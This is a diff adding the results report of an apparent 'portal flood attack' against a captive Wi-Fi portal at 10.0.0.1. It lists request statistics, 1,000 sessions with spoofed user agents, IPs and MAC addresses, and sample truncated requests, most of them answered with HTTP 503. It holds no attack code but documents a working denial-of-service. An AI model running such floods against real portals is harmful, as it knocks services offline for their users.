@@ -1,0 +1,548 @@
+================================================================================
+ENHANCED PORTAL FLOOD ATTACK REPORT
+================================================================================
+
+Target URL: http://10.0.0.1/client?page=dashboard
+Test Date: 2026-02-06 09:00:35
+Duration: 18.86 seconds
+Total Users: 1000
+Total Sessions: 1000
+
+📊 STATISTICS:
+----------------------------------------
+Total Requests: 1434
+Successful: 1434
+Failed: 0
+Success Rate: 100.00%
+Requests per Second: 76.02
+
+🔢 RESPONSE BREAKDOWN:
+----------------------------------------
+HTTP_503: 1396 (97.4%)
+REDIRECT_200: 38 (2.6%)
+
+📝 SAMPLE SESSIONS (First 20):
+----------------------------------------
+
+Session 1:
+  User Agent: Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWeb...
+  IP Address: 172.16.13.129
+  MAC Address: 9C:30:5B:5e:3d:bb
+  Requests: 1
+
+Session 2:
+  User Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac O...
+  IP Address: 172.16.16.126
+  MAC Address: 88:66:A5:d4:43:6d
+  Requests: 1
+
+Session 3:
+  User Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac O...
+  IP Address: 192.168.81.144
+  MAC Address: 64:5A:04:6e:3a:c6
+  Requests: 1
+
+Session 4:
+  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb...
+  IP Address: 172.16.30.249
+  MAC Address: 00:0C:29:90:17:bb
+  Requests: 1
+
+Session 5:
+  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb...
+  IP Address: 192.168.53.37
+  MAC Address: AC:BC:32:99:1c:19
+  Requests: 3
+
+Session 6:
+  User Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWeb...
+  IP Address: 192.168.87.103
+  MAC Address: 00:1E:4F:27:28:84
+  Requests: 1
+
+Session 7:
+  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb...
+  IP Address: 192.168.146.17
+  MAC Address: D8:96:95:46:8d:a4
+  Requests: 3
+
+Session 8:
+  User Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac O...
+  IP Address: 192.168.15.77
+  MAC Address: F0:18:98:23:ab:e5
+  Requests: 1
+
+Session 9:
+  User Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebK...
+  IP Address: 192.168.135.192
+  MAC Address: 88:66:A5:26:39:8a
+  Requests: 1
+
+Session 10:
+  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb...
+  IP Address: 192.168.19.124
+  MAC Address: 00:23:DF:22:7d:4b
+  Requests: 1
+
+Session 11:
+  User Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac O...
+  IP Address: 192.168.216.70
+  MAC Address: 00:26:BB:17:3f:89
+  Requests: 2
+
+Session 12:
+  User Agent: Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWeb...
+  IP Address: 10.0.212.195
+  MAC Address: 00:1C:42:8c:b3:0c
+  Requests: 3
+
+Session 13:
+  User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) Ap...
+  IP Address: 172.16.12.64
+  MAC Address: F0:18:98:33:33:9b
+  Requests: 3
+
+Session 14:
+  User Agent: Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWeb...
+  IP Address: 192.168.155.6
+  MAC Address: B8:E8:56:f3:74:26
+  Requests: 1
+
+Session 15:
+  User Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac O...
+  IP Address: 192.168.217.51
+  MAC Address: CC:20:E8:75:f2:0b
+  Requests: 2
+
+Session 16:
+  User Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWeb...
+  IP Address: 192.168.74.244
+  MAC Address: 00:26:2D:be:91:ce
+  Requests: 1
+
+Session 17:
+  User Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac O...
+  IP Address: 192.168.231.190
+  MAC Address: 00:50:56:7b:ac:a6
+  Requests: 1
+
+Session 18:
+  User Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWeb...
+  IP Address: 192.168.8.135
+  MAC Address: 00:26:2D:52:b1:2d
+  Requests: 3
+
+Session 19:
+  User Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebK...
+  IP Address: 172.16.29.165
+  MAC Address: B8:E8:56:4c:8d:12
+  Requests: 1
+
+Session 20:
+  User Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWeb...
+  IP Address: 192.168.122.216
+  MAC Address: B8:E8:56:9a:56:9e
+  Requests: 1
+
+📝 SAMPLE REQUESTS (First 50):
+----------------------------------------
+
+Request 1:
+  User ID: 0
+  Status: REDIRECT_200
+  Code: 200
+  Response Time: 76.4 ms
+  Method: GET
+  URL: http://10.0.0.1/client?mac=00%3A50%3A56%3A86%3A10%3A09&id=730954&client_mac=F0%3...
+
+Request 2:
+  User ID: 33
+  Status: HTTP_503
+  Code: 503
+  Response Time: 157.5 ms
+  Method: GET
+  URL: http://10.0.0.1/client?vlan=65&id=401401&client_ip=192.168.244.76&ap=00%3A11%3A2...
+
+Request 3:
+  User ID: 38
+  Status: HTTP_503
+  Code: 503
+  Response Time: 168.8 ms
+  Method: GET
+  URL: http://10.0.0.1/client?url=http%3A%2F%2Fwww.youtube.com&vlan=99&ssid=FreeWifi&re...
+
+Request 4:
+  User ID: 45
+  Status: HTTP_503
+  Code: 503
+  Response Time: 80.1 ms
+  Method: POST
+  URL: http://10.0.0.1/client?ip=10.0.175.9&client_mac=00%3A26%3A2D%3Afc%3A2f%3Ae9&t=17...
+
+Request 5:
+  User ID: 23
+  Status: HTTP_503
+  Code: 503
+  Response Time: 205.2 ms
+  Method: POST
+  URL: http://10.0.0.1/client?client_ip=192.168.32.17&client_mac=CC%3A20%3AE8%3A7a%3A18...
+
+Request 6:
+  User ID: 47
+  Status: HTTP_503
+  Code: 503
+  Response Time: 79.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?vlan=23&ip=192.168.204.90&mac=F0%3A18%3A98%3A2c%3Add%3A97...
+
+Request 7:
+  User ID: 46
+  Status: HTTP_503
+  Code: 503
+  Response Time: 99.2 ms
+  Method: POST
+  URL: http://10.0.0.1/client?mac=9C%3A30%3A5B%3Ae6%3A1a%3A3d&redirect=http%3A%2F%2Fcap...
+
+Request 8:
+  User ID: 42
+  Status: HTTP_503
+  Code: 503
+  Response Time: 127.4 ms
+  Method: GET
+  URL: http://10.0.0.1/client?vlan=2&mac=B8%3AE8%3A56%3A04%3A14%3A5c&ip=192.168.230.190...
+
+Request 9:
+  User ID: 26
+  Status: HTTP_503
+  Code: 503
+  Response Time: 213.4 ms
+  Method: GET
+  URL: http://10.0.0.1/client?redirect=http%3A%2F%2Fcaptive.apple.com%2Fhotspot-detect....
+
+Request 10:
+  User ID: 43
+  Status: HTTP_503
+  Code: 503
+  Response Time: 119.6 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ap=AA%3ABB%3ACC%3ADD%3AEE%3AFF&redirect=http%3A%2F%2Fcapt...
+
+Request 11:
+  User ID: 28
+  Status: HTTP_503
+  Code: 503
+  Response Time: 214.3 ms
+  Method: POST
+  URL: http://10.0.0.1/client?ssid=PublicWifi&client_mac=A4%3A5E%3A60%3A1f%3Acb%3Af8&ur...
+
+Request 12:
+  User ID: 32
+  Status: HTTP_503
+  Code: 503
+  Response Time: 219.3 ms
+  Method: GET
+  URL: http://10.0.0.1/client?t=1770339616&mac=64%3A5A%3A04%3A23%3Ac8%3Ac7&client_ip=19...
+
+Request 13:
+  User ID: 24
+  Status: HTTP_503
+  Code: 503
+  Response Time: 235.6 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ip=192.168.250.101&vlan=53&url=http%3A%2F%2Fwww.google.co...
+
+Request 14:
+  User ID: 29
+  Status: HTTP_503
+  Code: 503
+  Response Time: 228.0 ms
+  Method: POST
+  URL: http://10.0.0.1/client?url=http%3A%2F%2Fwww.youtube.com&t=1770339616&id=255302&c...
+
+Request 15:
+  User ID: 36
+  Status: HTTP_503
+  Code: 503
+  Response Time: 218.0 ms
+  Method: GET
+  URL: http://10.0.0.1/client?client_ip=192.168.120.144&ssid=Hotspot&ip=192.168.212.108...
+
+Request 16:
+  User ID: 25
+  Status: HTTP_503
+  Code: 503
+  Response Time: 250.6 ms
+  Method: GET
+  URL: http://10.0.0.1/client?t=1770338932&redirect=http%3A%2F%2Fcaptive.apple.com%2Fho...
+
+Request 17:
+  User ID: 30
+  Status: HTTP_503
+  Code: 503
+  Response Time: 241.5 ms
+  Method: GET
+  URL: http://10.0.0.1/client?vlan=51&client_ip=172.16.21.26&ssid=FreeWifi&page=dashboa...
+
+Request 18:
+  User ID: 22
+  Status: HTTP_503
+  Code: 503
+  Response Time: 262.1 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ssid=PisoWifi&ap=AA%3ABB%3ACC%3ADD%3AEE%3AFF&client_mac=0...
+
+Request 19:
+  User ID: 44
+  Status: HTTP_503
+  Code: 503
+  Response Time: 145.9 ms
+  Method: POST
+  URL: http://10.0.0.1/client?t=1770339612&redirect=http%3A%2F%2Fwww.google.com%2Fgener...
+
+Request 20:
+  User ID: 48
+  Status: HTTP_503
+  Code: 503
+  Response Time: 130.3 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ip=192.168.14.146&ssid=FreeWifi&vlan=43&t=1770337995&clie...
+
+Request 21:
+  User ID: 37
+  Status: HTTP_503
+  Code: 503
+  Response Time: 238.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?vlan=61&client_mac=00%3A1E%3A4F%3A3c%3A24%3A02&mac=00%3A1...
+
+Request 22:
+  User ID: 27
+  Status: HTTP_503
+  Code: 503
+  Response Time: 258.2 ms
+  Method: GET
+  URL: http://10.0.0.1/client?mac=00%3A1A%3A11%3A68%3A94%3Acb&client_ip=10.0.215.115&ur...
+
+Request 23:
+  User ID: 31
+  Status: HTTP_503
+  Code: 503
+  Response Time: 264.3 ms
+  Method: GET
+  URL: http://10.0.0.1/client?t=1770339616&client_mac=CC%3A20%3AE8%3A5e%3A9f%3Af8&redir...
+
+Request 24:
+  User ID: 39
+  Status: HTTP_503
+  Code: 503
+  Response Time: 252.6 ms
+  Method: GET
+  URL: http://10.0.0.1/client?vlan=86&redirect=http%3A%2F%2Fcaptive.apple.com%2Fhotspot...
+
+Request 25:
+  User ID: 35
+  Status: HTTP_503
+  Code: 503
+  Response Time: 263.2 ms
+  Method: POST
+  URL: http://10.0.0.1/client?ap=00%3A11%3A22%3A33%3A44%3A55&ssid=PisoWifi&client_mac=9...
+
+Request 26:
+  User ID: 49
+  Status: HTTP_503
+  Code: 503
+  Response Time: 146.8 ms
+  Method: GET
+  URL: http://10.0.0.1/client?mac=00%3A23%3ADF%3A8a%3A02%3Ad3&ssid=GuestWifi&ip=192.168...
+
+Request 27:
+  User ID: 41
+  Status: HTTP_503
+  Code: 503
+  Response Time: 254.1 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ap=AA%3ABB%3ACC%3ADD%3AEE%3AFF&ip=192.168.42.138&vlan=96&...
+
+Request 28:
+  User ID: 11
+  Status: HTTP_503
+  Code: 503
+  Response Time: 14.8 ms
+  Method: GET
+  URL: http://10.0.0.1/client?url=http%3A%2F%2Fwww.facebook.com&ap=AA%3ABB%3ACC%3ADD%3A...
+
+Request 29:
+  User ID: 50
+  Status: HTTP_503
+  Code: 503
+  Response Time: 67.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?url=http%3A%2F%2Fwww.google.com&client_ip=192.168.6.122&r...
+
+Request 30:
+  User ID: 51
+  Status: HTTP_503
+  Code: 503
+  Response Time: 54.4 ms
+  Method: GET
+  URL: http://10.0.0.1/client?vlan=16&ip=192.168.248.198&id=822724&mac=64%3A5A%3A04%3A6...
+
+Request 31:
+  User ID: 52
+  Status: HTTP_503
+  Code: 503
+  Response Time: 116.1 ms
+  Method: GET
+  URL: http://10.0.0.1/client?client_mac=8C%3A85%3A90%3A05%3A7f%3A33&mac=00%3A0C%3A29%3...
+
+Request 32:
+  User ID: 54
+  Status: HTTP_503
+  Code: 503
+  Response Time: 60.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?client_ip=192.168.237.110&vlan=40&redirect=http%3A%2F%2Fw...
+
+Request 33:
+  User ID: 57
+  Status: HTTP_503
+  Code: 503
+  Response Time: 45.5 ms
+  Method: GET
+  URL: http://10.0.0.1/client?t=1770336493&url=http%3A%2F%2Fwww.google.com&id=a79f45ee&...
+
+Request 34:
+  User ID: 55
+  Status: HTTP_503
+  Code: 503
+  Response Time: 54.8 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ip=192.168.1.237&t=1770339616&ap=AA%3ABB%3ACC%3ADD%3AEE%3...
+
+Request 35:
+  User ID: 56
+  Status: HTTP_503
+  Code: 503
+  Response Time: 55.8 ms
+  Method: GET
+  URL: http://10.0.0.1/client?mac=FC%3AF1%3A52%3A5a%3A14%3Abc&url=http%3A%2F%2Fwww.face...
+
+Request 36:
+  User ID: 53
+  Status: HTTP_503
+  Code: 503
+  Response Time: 207.3 ms
+  Method: GET
+  URL: http://10.0.0.1/client?client_ip=192.168.174.241&redirect=http%3A%2F%2Fcaptive.a...
+
+Request 37:
+  User ID: 62
+  Status: HTTP_503
+  Code: 503
+  Response Time: 229.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?url=http%3A%2F%2Fwww.google.com&client_mac=A4%3A5E%3A60%3...
+
+Request 38:
+  User ID: 66
+  Status: HTTP_503
+  Code: 503
+  Response Time: 223.4 ms
+  Method: POST
+  URL: http://10.0.0.1/client?mac=D8%3A96%3A95%3Ae4%3A51%3A7b&client_mac=D8%3A96%3A95%3...
+
+Request 39:
+  User ID: 107
+  Status: HTTP_503
+  Code: 503
+  Response Time: 77.1 ms
+  Method: POST
+  URL: http://10.0.0.1/client?ap=AA%3ABB%3ACC%3ADD%3AEE%3AFF&ssid=PisoWifi&redirect=htt...
+
+Request 40:
+  User ID: 94
+  Status: HTTP_503
+  Code: 503
+  Response Time: 165.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?id=957731&ssid=FreeWifi&mac=88%3A66%3AA5%3A3e%3A78%3A1d&t...
+
+Request 41:
+  User ID: 61
+  Status: HTTP_503
+  Code: 503
+  Response Time: 241.1 ms
+  Method: POST
+  URL: http://10.0.0.1/client?vlan=29&t=1770339617&redirect=http%3A%2F%2Fwww.msftconnec...
+
+Request 42:
+  User ID: 85
+  Status: HTTP_503
+  Code: 503
+  Response Time: 192.7 ms
+  Method: GET
+  URL: http://10.0.0.1/client?mac=B8%3AE8%3A56%3Ae2%3Aea%3A24&ssid=GuestWifi&ap=00%3A11...
+
+Request 43:
+  User ID: 71
+  Status: HTTP_503
+  Code: 503
+  Response Time: 225.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ap=AA%3ABB%3ACC%3ADD%3AEE%3AFF&ssid=Hotspot&ip=192.168.11...
+
+Request 44:
+  User ID: 84
+  Status: HTTP_503
+  Code: 503
+  Response Time: 199.1 ms
+  Method: GET
+  URL: http://10.0.0.1/client?redirect=http%3A%2F%2Fwww.google.com%2Fgenerate_204&clien...
+
+Request 45:
+  User ID: 103
+  Status: HTTP_503
+  Code: 503
+  Response Time: 161.3 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ip=192.168.179.79&client_mac=00%3A23%3ADF%3A85%3A08%3A3f&...
+
+Request 46:
+  User ID: 63
+  Status: HTTP_503
+  Code: 503
+  Response Time: 247.7 ms
+  Method: GET
+  URL: http://10.0.0.1/client?ip=10.0.47.2&redirect=http%3A%2F%2Fwww.msftconnecttest.co...
+
+Request 47:
+  User ID: 70
+  Status: HTTP_503
+  Code: 503
+  Response Time: 234.9 ms
+  Method: GET
+  URL: http://10.0.0.1/client?mac=00%3A25%3ABC%3A87%3Ad1%3A90&ssid=Hotspot&t=1770339039...
+
+Request 48:
+  User ID: 59
+  Status: HTTP_503
+  Code: 503
+  Response Time: 255.2 ms
+  Method: POST
+  URL: http://10.0.0.1/client?t=1770336718&url=http%3A%2F%2Fwww.facebook.com&vlan=25&ap...
+
+Request 49:
+  User ID: 68
+  Status: HTTP_503
+  Code: 503
+  Response Time: 236.5 ms
+  Method: POST
+  URL: http://10.0.0.1/client?redirect=http%3A%2F%2Fcaptive.apple.com%2Fhotspot-detect....
+
+Request 50:
+  User ID: 65
+  Status: HTTP_503
+  Code: 503
+  Response Time: 248.4 ms
+  Method: POST
+  URL: http://10.0.0.1/client?ap=00%3A11%3A22%3A33%3A44%3A55&client_ip=192.168.176.218&...
